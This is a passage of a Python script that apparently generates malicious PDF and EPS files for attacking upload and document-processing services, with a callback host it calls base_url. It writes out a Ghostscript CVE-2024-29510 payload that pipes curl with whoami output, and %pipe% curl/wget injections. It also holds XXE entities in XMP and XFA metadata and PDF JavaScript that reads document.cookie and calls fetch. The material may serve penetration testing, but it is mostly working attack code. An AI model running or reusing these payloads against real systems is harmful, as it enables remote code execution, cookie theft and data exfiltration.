(%pipe%curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-cve-2024-29510) (r) file

quit'''
    
    if should_generate_type('rce'):
        eps_path = rce_dir / "rce7_cve_2024_29510.eps"
        with open(eps_path, 'wb') as f:
            f.write(cve_2024_29510_eps.encode())
        
        pdf_path = rce_dir / "rce7_cve_2024_29510.pdf"
        try:
            result = subprocess.run(['gs', '-dNOPAUSE', '-dBATCH', '-dNOSAFER', '-sDEVICE=pdfwrite', 
                                   f'-sOutputFile={pdf_path}', str(eps_path)], 
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30, check=False)
            if not pdf_path.exists() or pdf_path.stat().st_size < 100:
                pdf_path = None
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
            pdf_path = None
    
    pdf_lfi2_uri_file = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (file:///C:/Windows/system32/calc.exe)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('lfi'):
        with open(lfi_dir / "lfi2_uri_file.pdf", 'wb') as f:
            f.write(pdf_lfi2_uri_file.encode())
    
    pdf_master = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
/OpenAction <<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
/Names <<
/JavaScript <<
/Names [(test) 6 0 R (iframe) 15 0 R (xhr) 16 0 R (fetch) 17 0 R (xss1) 18 0 R (xss5) 19 0 R (xss9) 20 0 R]
>>
/EmbeddedFiles <<
/Names [(evil.zip) 7 0 R]
>>
>>
/AcroForm <<
/XFA 8 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [9 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 400
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xmp">%x;]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
<xmpMM:DocumentID>{base_url}/xmp</xmpMM:DocumentID>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI ({base_url}/img1)
>>
stream
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI ({base_url}/font.ttf)
>>
>>
endobj
6 0 obj
<<
/S /JavaScript
/JS (this.importDataObject("pwn","{base_url}/file");)
>>
endobj
7 0 obj
<<
/Type /FileSpec
/F (evil.zip)
/EF <<
/F 10 0 R
>>
>>
endobj
8 0 obj
<<
/Length 300
>>
stream
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xfa-xxe">%x;]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<image href="{base_url}/xfa-img"/>
<field name="test">Test</field>
</template>
</xdp:xdp>
endstream
endobj
9 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
/Font <<
/F1 5 0 R
/F2 24 0 R
>>
/ColorSpace <<
/CS1 11 0 R
>>
>>
/Annots [12 0 R 13 0 R 21 0 R 22 0 R 23 0 R]
/Contents 14 0 R
>>
endobj
10 0 obj
<<
/Type /EmbeddedFile
/Length 0
/F <<
/URI ({base_url}/evil.zip)
>>
>>
endobj
11 0 obj
<<
/N 3
/Alternate /DeviceRGB
/Filter /FlateDecode
/Length 0
/URI ({base_url}/evil.icc)
>>
endobj
12 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI ({base_url}/link1)
>>
>>
endobj
13 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [300 300 400 400]
/A <<
/S /GoToR
/F ({base_url}/remote.pdf)
/D [0 /Fit]
>>
>>
endobj
14 0 obj
<<
/Length 0
>>
stream
endstream
endobj
15 0 obj
<<
/S /JavaScript
/JS (app.alert("Loading iframe"); var html = '<iframe src="{base_url}/iframe"></iframe>'; this.getField("test").value = html;)
>>
endobj
16 0 obj
<<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();)
>>
endobj
17 0 obj
<<
/S /JavaScript
/JS (fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
endobj
18 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); Object.getPrototypeOf(function*(){{}}).constructor = null; ((function*(){{}}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src={base_url}/xss1>');"))().next();)
>>
endobj
19 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); confirm\\(2\\); prompt\\(document.cookie\\); document.write\\("<iframe src='{base_url}/xss5'>"\\);)
>>
endobj
20 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); console.println\\(delete window\\); console.println\\(delete confirm\\); console.println\\(delete document\\); window.confirm\\(document.cookie\\);fetch('{base_url}/xss9');)
>>
endobj
21 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [200 200 300 300]
/A <<
/S /URI
/URI (data:text/html,<script>alert\\(2\\);fetch('{base_url}/xss2');</script>)
>>
>>
endobj
22 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [400 400 500 500]
/A <<
/S /URI
/URI (javascript:confirm\\(2\\);fetch('{base_url}/xss6');)
>>
>>
endobj
23 0 obj
<<
/Type /Annot
/Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126]
/Subtype /Text
/M (D:20210402013803+02'00)
/C [1 1 0]
/T (\\">'><details open ontoggle=confirm\\(3\\);fetch('{base_url}/xss3');>)
/P 9 0 R
/Contents (\\">'><details open ontoggle=confirm('XSS');>)
>>
endobj
24 0 obj
<<
/BaseFont /SNCSTG+CMBX12
/FontDescriptor 25 0 R
/FontMatrix [ 1 2 3 4 5 (1\\); alert\\('origin: '+window.origin+', pdf url: '+\\\\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\\);fetch('{base_url}/xss8');) ]
/Subtype /Type1
/Type /Font
>>
endobj
25 0 obj
<<
/Type /FontDescriptor
/FontName /SNCSTG+CMBX12
>>
endobj
xref
0 26
trailer
<<
/Size 26
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(output_dir / "master.pdf", 'wb') as f:
            f.write(pdf_master.encode())
    
    pdf_master2_rce = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 300
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{
    null restore
    stopped {{
        pop
    }} if
    (legal)
}} stopped
{{
    (legal\\) {{
        pop
        legal
    }} stopped
    {{
        restore
    }} ifelse
}} ifelse
mark /OutputFile (%pipe%curl {base_url}/rce-ghostscript) currentdevice putdeviceprops
mark /OutputFile (%pipe%wget {base_url}/rce-postscript) currentdevice putdeviceprops
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(output_dir / "master2_rce.pdf", 'wb') as f:
            f.write(pdf_master2_rce.encode())
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'pdf', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'pdf', burp_collab, tech_filter)
